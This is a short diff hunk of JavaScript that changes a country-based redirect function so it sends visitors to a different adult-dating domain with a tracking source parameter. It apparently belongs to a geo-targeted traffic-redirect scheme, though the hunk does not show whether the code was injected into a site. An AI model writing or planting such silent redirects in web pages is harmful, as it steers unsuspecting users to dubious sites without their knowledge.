@@ -12,7 +12,7 @@
 
     // Function to redirect the user to site2.ru
     function checkCountry2() {
-        window.location.href = "https://dbrpmrq.youradultplay.com/uw22cmz?s1=" + source;
+        window.location.href = "https://dbrpmrq.exciting-dating-nows.com/uwm2cmy?s1=" + source;
     }
 
     // Function to handle errors when fetching the country data
